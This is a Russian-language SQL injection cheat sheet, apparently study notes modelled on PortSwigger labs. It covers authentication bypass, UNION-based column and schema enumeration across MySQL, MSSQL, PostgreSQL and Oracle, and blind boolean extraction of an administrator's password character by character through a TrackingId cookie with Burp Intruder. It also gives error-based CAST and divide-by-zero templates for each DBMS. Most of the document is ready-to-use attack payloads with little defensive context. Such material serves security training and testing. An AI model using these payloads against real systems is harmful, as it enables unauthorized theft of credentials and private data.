## 🚪 Оглавление 🚪
- [Что такое SQL-инъекция?](#что-такое-sql-инъекция-sqli)
- [1. Извлечение скрытых данных (WHERE)](#1-извлечение-скрытых-данных-where)
- [2. Обход аутентификации](#2-обход-аутентификации-login-bypass)
- [3. UNION-атака](#3-union-атака)
  - [3.1 Определение колонок](#31-определение-колонок)
  - [3.2 Поиск строковых столбцов](#32-поиск-столбцов-с-полезным-типом-данных)
  - [3.3 Извлечение данных](#33-извлечение-важных-данных)
  - [3.4 Конкатенация значений](#34-извлечение-нескольких-значений-из-одного-столбца)
- [4. Анализ базы данных](#-анализ-базы-данных-при-sql-инъекциях)
  - [4.1 Определение версии СУБД](#1-определение-типа-и-версии-базы-данных)
  - [4.2 Список таблиц (без Oracle)](#получение-списка-таблиц-кроме-oracle)
  - [4.3 Список столбцов (без Oracle)](#получение-списка-столбцов-кроме-oracle)
  - [4.4 Особенности Oracle](#анализ-базы-данных-в-oracle)

# 💉SQL-инъекция💉 (SQLi)

SQL-инъекция — это уязвимость веб-безопасности, которая позволяет злоумышленнику вмешиваться в запросы, которые приложение отправляет к своей базе данных.

## Что даёт атакующему?
- Возможность читать конфиденциальные данные (имена пользователей, пароли, личную информацию).
- Возможность изменять или удалять данные.
- В некоторых случаях — выполнять команды на сервере.

## Основная причина
Неправильная фильтрация пользовательского ввода перед подстановкой в SQL-запрос.
<details>
<summary><b>⚙️ 1. Извлечение скрытых данных (WHERE)</b></summary>
- ' OR 1=1--
- ' AND 1=1-- (для слепой)
</details>
<details>
<summary><b>🔑 2. Обход аутентификации (Login Bypass)</b></summary>
- admin' --
- ' OR 1=1; --
- SELECT * FROM users WHERE username = 'administrator'--' AND password = ''<br>
Измените username параметр, присвоив ему значение:administrator'--
</details>
<details>
<summary><b>🧩 3. UNION-атака (определение кол-во колонок)</b></summary>
' ORDER BY 1--<br>
' ORDER BY 2--<br>
' ORDER BY 3--<br>
' UNION SELECT NULL--<br>
' UNION SELECT NULL,NULL--<br>
' UNION SELECT NULL,NULL,NULL--<br>

### 3.1 UNION-атака (определение колонок в Oracle)
В Oracle существует встроенная таблица dual, которую можно использовать для этой цели. Таким образом, внедряемые запросы в Oracle должны выглядеть следующим образом:
- ' UNION SELECT NULL FROM DUAL--

### 3.2 UNION-атака (Поиск столбцов с полезным типом данных)
- ' UNION SELECT 'a',NULL,NULL,NULL--<br>
- ' UNION SELECT NULL,'a',NULL,NULL--<br>
- ' UNION SELECT NULL,NULL,'a',NULL--<br>
- ' UNION SELECT NULL,NULL,NULL,'a'--<br>

Если ошибка не возникает, и ответ приложения содержит дополнительное содержимое, включая внедренное строковое значение, то соответствующий столбец подходит для извлечения строковых данных.

### 3.3 UNION-атака (Использование SQL-инъекции и атаки UNION для извлечения важных данных.)
- ' UNION SELECT username, password FROM users--<br>

Для осуществления этой атаки необходимо знать, что существует таблица с именем usersи двумя столбцами с именами usernameи password.
Без этой информации вам пришлось бы угадывать имена таблиц и столбцов.
Все современные базы данных предоставляют способы изучения структуры базы данных и определения того, какие таблицы и столбцы они содержат.

### 3.4 UNION-атака (Извлечение нескольких значений из одного столбца.)
- ' UNION SELECT username || '~' || password FROM users--<br>
В разных базах данных используется разный синтаксис для конкатенации строк. Для получения более подробной информации см. шпаргалку по SQL-инъекциям.<br>
portswigger.net/web-security/sql-injection/cheat-sheet<br>
</details>
<details>
 <summary><b>🔍 4. Анализ базы данных при SQL-инъекциях</b></summary>

Для успешной эксплуатации SQL-инъекций часто необходимо получить информацию о базе данных:
- Тип и версия СУБД
- Имена таблиц
- Имена столбцов

---

### 4.1 Определение типа и версии базы данных

Можно внедрить запросы, специфичные для конкретной СУБД, и посмотреть, какой из них сработает.

| СУБД | Запрос для получения версии |
|------|----------------------------|
| **Microsoft SQL Server** | `SELECT @@version` |
| **MySQL** | `SELECT @@version` |
| **Oracle** | `SELECT * FROM v$version` |
| **PostgreSQL** | `SELECT version()` |

### Пример через UNION-атаку:
' UNION SELECT @@version--

#### Пример вывода (Microsoft SQL Server):
Microsoft SQL Server 2016 (SP2) (KB4052908) - 13.0.5026.0 (X64)<br>
Mar 18 2018 09:11:49<br>
Copyright (c) Microsoft Corporation<br>
Standard Edition (64-bit) on Windows Server 2016 Standard 10.0 <X64> (Build 14393: ) (Hypervisor)<br>

### 4.2 Получение списка таблиц (кроме Oracle)
Большинство типов баз данных (за исключением Oracle) имеют набор представлений, называемых информационной схемой. Она предоставляет информацию о базе данных.<br>
Запрос для получения списка таблиц:<br>
- SELECT * FROM information_schema.tables

#### Пример результата:
| TABLE_CATALOG | TABLE_SCHEMA | TABLE_NAME | TABLE_TYPE |
|---------------|--------------|------------|------------|
| MyDatabase    | dbo          | Products   | BASE TABLE |
| MyDatabase    | dbo          | Users      | BASE TABLE |
| MyDatabase    | dbo          | Feedback   | BASE TABLE |

### Готовый payload для UNION-атаки:
' UNION SELECT table_name, NULL FROM information_schema.tables--

### 4.3 Получение списка столбцов (кроме Oracle)
Используй представление information_schema.columns

### Запрос для получения столбцов конкретной таблицы:
SELECT * FROM information_schema.columns WHERE table_name = 'Users'
#### Пример результата:
| TABLE_CATALOG | TABLE_SCHEMA | TABLE_NAME | COLUMN_NAME | DATA_TYPE |
|---------------|--------------|------------|-------------|-----------|
| MyDatabase    | dbo          | Users      | UserId      | int       |
| MyDatabase    | dbo          | Users      | Username    | varchar   |
| MyDatabase    | dbo          | Users      | Password    | varchar   |
#### Готовый payload для UNION-атаки:
' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name = 'Users'--

### 4.4 Анализ базы данных в Oracle
В Oracle нет information_schema. Используй другие представления:<br>

| Что узнать | Запрос |
| :--- | :--- |
| Список таблиц | `SELECT * FROM all_tables` |
| Столбцы таблицы | `SELECT * FROM all_tab_columns WHERE table_name = 'USERS'` |
### Готовые payload'ы для Oracle:
- ' UNION SELECT table_name, NULL FROM all_tables--<br>
- ' UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name = 'USERS'--<br>
### Важно: В Oracle все имена таблиц и столбцов хранятся в верхнем регистре!
</details>

### 🕵️ 5. Слепая SQL-инъекция
Слепая SQL-инъекция происходит, когда приложение уязвимо для SQL-инъекций, но его HTTP-ответы не содержат результатов соответствующего SQL-запроса или подробностей об ошибках базы данных.<br>

Многие методы, такие как UNIONатаки, неэффективны против уязвимостей, связанных со слепой SQL-инъекцией. Это связано с тем, что они основаны на возможности увидеть результаты внедренного запроса в ответах приложения. Тем не менее, использование слепой SQL-инъекции для доступа к несанкционированным данным по-прежнему возможно, но для этого необходимо применять другие методы.<br>

### 5.1 Использование слепой SQL-инъекции путем запуска условных ответов.

Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4' AND '1'='1<br>
Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4' AND '1'='2<br>

- Первое из этих значений приводит к тому, что запрос возвращает результаты, поскольку внедренное AND<br>
'1'='1 условие истинно. В результате отображается сообщение «Добро пожаловать обратно».<br>
- Второе значение приводит к тому, что запрос не возвращает никаких результатов, поскольку внедренное условие<br> ложно. Сообщение «Добро пожаловать обратно» не отображается.

Например, предположим, что есть таблица с именем Usersи столбцами Usernameи Password, и пользователь с именем Administrator.<br> Вы можете определить пароль для этого пользователя, отправляя серию входных данных для проверки пароля по одному символу за раз.

Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) = 'm<br>
**В результате возвращается сообщение "Добро пожаловать обратно", указывающее на то, что внедренное условие истинно, и, следовательно, первый символ пароля m**
**Это требует гораздо большего количества запросов, поэтому вам потребуется использовать Burp Intruder**
- Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4' AND (SELECT SUBSTRING(password,&1&,1) FROM users WHERE username='administrator')='§a§ **(ВАРИАНТ 1)** <br>
- Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), &1&, 1) = '&m& **(ВАРИАНТ 2)** <br>
  
#### Также можно проверить наличие таблиц и пользователя

- Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4' AND (SELECT 'a' FROM users LIMIT 1)='a<br> **(Убедитесь, что условие выполняется, и подтвердите наличие таблицы с именем users.)**
- Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4' AND (SELECT 'a' FROM users WHERE username='administrator')='a<br> **(Убедитесь, что условие выполняется, и подтвердите, что существует пользователь с именем administrator**)

### определение кол-во символов в пароле
- Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)=&1&)='&a&<br>
**Символ & вокруг цифр и букв помогает программе понять какое значение нужно менять при каждом последующем запросе** 
**При использовании Burp Intruder потребуется список символов для быстрого перебора в & обычно это числа и буквы но также могут быть спец символы**

### SQL-инъекция, основанная на ошибках
**SQL-инъекции, основанные на ошибках, относятся к случаям, когда вы можете использовать сообщения об ошибках для извлечения или получения конфиденциальных данных из базы данных, даже в условиях отсутствия доступа к ней. Возможности зависят от конфигурации базы данных и типов ошибок, которые вы можете вызвать**

## Типы Error‑based SQL‑инъекций

| Тип | Что это | Когда использовать |
| :--- | :--- | :--- |
| **Условные ошибки** | Ты вызываешь ошибку **только если условие истинно** и смотришь на разницу в ответе (`500` vs `200`). | Когда ошибки **видны**, но **нет вывода данных**. |
| **Подробные ошибки** | Ты заставляешь БД **выдать данные прямо в тексте ошибки** через преобразование типов (`CAST` / `::int`). | Когда ошибки **видны** и **содержат полный текст ошибки БД**. |

### 📌 Трафарет 1: Условные ошибки (CASE + 1/0)<br>
**Когда нужно проверить один символ и понять, верно ли условие (по статусу 500).** <br>
#### Универсальный шаблон (PostgreSQL)<br>
' AND (SELECT CASE WHEN (условие) THEN 1/0 ELSE 1 END FROM users LIMIT 1)=1<br>
#### Конкретный пример (проверка первого символа пароля)<br>
TrackingId=xyz' AND (SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN 1/0 ELSE 1 END FROM users WHERE username='administrator')=1<br>

Как использовать<br>
Подставляешь символ (a, b, c...).<br>
Если ответ 500 → символ верный.<br>
Если ответ 200 (или 302) → не верный.<br>

### 📌 Трафарет 2: Подробные ошибки (CAST / ::int)<br>
**Когда нужно вытащить всё значение за один запрос.** <br>
#### Универсальный шаблон (PostgreSQL)<br>
'||(SELECT нужное_поле FROM нужная_таблица LIMIT 1)::int||'<br>
#### Конкретный пример (пароль администратора)<br>
TrackingId=xyz'||(SELECT password FROM users WHERE username='administrator')::int||'<br>

Как использовать<br>

## ⚠️ Адаптация под разные СУБД
### PostgreSQL
- **CAST:** `'||(SELECT password FROM users LIMIT 1)::int||'`
- **Условный:** `' AND (SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN 1/0 ELSE 1 END FROM users LIMIT 1)=1`

### Oracle
- **CAST:** `'||(SELECT CAST(password AS int) FROM users WHERE ROWNUM=1 AND username='administrator')||'`
- **Условный:** `' AND (SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE ROWNUM=1 AND username='administrator')=''`

### MySQL
- **CAST:** `' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--`
- **Условный:** `' AND IF(SUBSTR(password,1,1)='a', 1/0, 1)=1--`

### MSSQL
- **CAST:** `' AND 1=CONVERT(int, (SELECT TOP 1 password FROM users))--`
- **Условный:** `' AND (SELECT CASE WHEN SUBSTRING(password,1,1)='a' THEN 1/0 ELSE 1 END FROM users)=1`

## 🔧 Решение проблем с длиной запроса

| Проблема | Решение |
| :--- | :--- |
| **Запрос слишком длинный** | Убери оригинальный `TrackingId` (оставь только `'`). |
| **`CAST(... AS int)` слишком длинное** | Используй короткий синтаксис `::int` (PostgreSQL). |
| **Не помещается `LIMIT 1`** | Если уверен, что в таблице одна строка — убери `LIMIT`. |
| **Конкатенация с `||` длиннее `AND`** | Используй `AND`, если это короче. |
| **Комментарий `--` не помещается** | Используй конкатенацию `||`, которая замыкает строку без комментария. |
